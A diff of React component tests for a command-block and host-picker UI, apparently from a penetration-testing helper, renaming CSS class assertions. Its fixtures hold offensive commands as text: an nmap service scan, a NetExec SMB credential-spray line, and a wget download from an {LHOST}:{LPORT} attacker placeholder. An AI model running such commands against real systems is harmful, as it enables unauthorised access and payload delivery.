@@ -47,8 +47,8 @@ describe("CommandBlock", () => {
   it("command block copies and marks placeholders", async () => {
     const onCopy = vi.fn();
     render(<CommandBlock text="nmap -sV {TARGET} -p {PORT}" placeholders onCopy={onCopy} />);
-    expect(screen.getByText("{TARGET}")).toHaveClass("text-warn");
-    expect(screen.getByText("{PORT}")).toHaveClass("text-warn");
+    expect(screen.getByText("{TARGET}")).toHaveClass("command-block__warn");
+    expect(screen.getByText("{PORT}")).toHaveClass("command-block__warn");
     const user = userEvent.setup();
     await user.click(screen.getByRole("button", { name: "Copy" }));
     expect(onCopy).toHaveBeenCalledTimes(1);
@@ -62,7 +62,7 @@ describe("CommandBlock wrapping", () => {
     const { container } = render(<CommandBlock text={cmd} />);
     const tokens = [...container.querySelectorAll("[data-token]")];
     expect(tokens.map((t) => t.textContent)).toEqual(["nxc", "smb", "-u", "'backup-operator'", "--continue-on-success"]);
-    for (const t of tokens) expect(t).toHaveClass("inline-block", "max-w-full", "[overflow-wrap:anywhere]");
+    for (const t of tokens) expect(t).toHaveClass("command-block__token");
     expect(container.querySelector("code")!.textContent).toBe(cmd);
     await userEvent.setup().click(screen.getByRole("button", { name: "Copy" }));
     expect(await navigator.clipboard.readText()).toBe(cmd);
@@ -111,14 +111,14 @@ describe("PickerTrigger", () => {
   it("picker trigger is in the tab order and shows Pick one when unset", async () => {
     render(<PickerTrigger prefix="Host" />);
     const b = screen.getByRole("button");
-    expect(screen.getByText("Pick one")).toHaveClass("text-warn");
+    expect(screen.getByText("Pick one")).toHaveClass("picker-trigger__placeholder");
     await userEvent.tab();
     expect(b).toHaveFocus();
   });
 
   it("shows the value when set", () => {
     render(<PickerTrigger prefix="Host" value="192.0.2.10" />);
-    expect(screen.getByText("192.0.2.10")).toHaveClass("text-body");
+    expect(screen.getByText("192.0.2.10")).toHaveClass("picker-trigger__value");
     expect(screen.queryByText("Pick one")).not.toBeInTheDocument();
   });
 });
@@ -128,7 +128,7 @@ describe("CommandBlock placeholders inside a token", () => {
     const { container } = render(<CommandBlock text="wget http://{LHOST}:{LPORT}/x -O out" placeholders />);
     const tokens = [...container.querySelectorAll("[data-token]")];
     expect(tokens.map((t) => t.textContent)).toEqual(["wget", "http://{LHOST}:{LPORT}/x", "-O", "out"]);
-    expect(tokens[1]).toHaveClass("inline-block", "[overflow-wrap:anywhere]");
+    expect(tokens[1]).toHaveClass("command-block__token");
     const marked = [...tokens[1].querySelectorAll("mark")].map((m) => m.textContent);
     expect(marked).toEqual(["{LHOST}", "{LPORT}"]);
     expect(container.querySelector("code")!.textContent).toBe("wget http://{LHOST}:{LPORT}/x -O out");
